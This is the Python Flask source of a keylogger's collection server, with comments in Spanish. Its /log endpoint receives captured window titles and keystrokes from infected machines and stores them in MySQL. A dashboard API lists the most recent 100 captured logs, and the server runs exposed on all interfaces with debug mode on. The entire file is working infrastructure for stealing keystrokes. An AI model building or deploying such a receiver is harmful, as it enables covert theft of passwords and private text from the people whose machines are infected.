from flask import Flask, request, jsonify, render_template
import pymysql
from flask_cors import CORS
import datetime

app = Flask(__name__)
CORS(app)

# --- CONFIGURACIÓN DE LA BASE DE DATOS ---
DB_HOST = "CREDENCIAL"
DB_USER = "CREDENCIAL"
DB_PASSWORD = "CREDENCIAL" # <--- RECUERDA PONER TU CONTRASEÑA
DB_NAME = "CREDENCIAL"

def get_db_connection():
    connection = pymysql.connect(
        host=DB_HOST,
        user=DB_USER,
        password=DB_PASSWORD,
        database=DB_NAME,
        cursorclass=pymysql.cursors.DictCursor
    )
    return connection

# --- RUTA PARA VER LA WEB (DASHBOARD) ---
@app.route('/')
def index():
    """Renderiza el panel de control HTML."""
    return render_template('dashboard.html')

# --- API: OBTENER LOGS (Para el dashboard) ---
@app.route('/api/get_logs', methods=['GET'])
def get_logs():
    """Devuelve los últimos 100 logs en formato JSON."""
    connection = None
    try:
        connection = get_db_connection()
        with connection.cursor() as cursor:
            # Traemos los últimos 100 registros ordenados por fecha
            sql = "SELECT id, window_title, keystrokes, timestamp FROM logs ORDER BY timestamp DESC LIMIT 100"
            cursor.execute(sql)
            result = cursor.fetchall()
        return jsonify(result), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        if connection:
            connection.close()

# --- API: RECIBIR LOGS (Desde el keylogger) ---
@app.route('/log', methods=['POST'])
def receive_log():
    data = request.get_json()
    if not data or 'window_title' not in data or 'keystrokes' not in data:
        return jsonify({"status": "error", "message": "Faltan datos"}), 400

    window_title = data['window_title']
    keystrokes = data['keystrokes']

    connection = None
    try:
        connection = get_db_connection()
        with connection.cursor() as cursor:
            sql = "INSERT INTO logs (window_title, keystrokes) VALUES (%s, %s)"
            cursor.execute(sql, (window_title, keystrokes))
        connection.commit()
        return jsonify({"status": "success"}), 201
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        if connection:
            connection.close()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
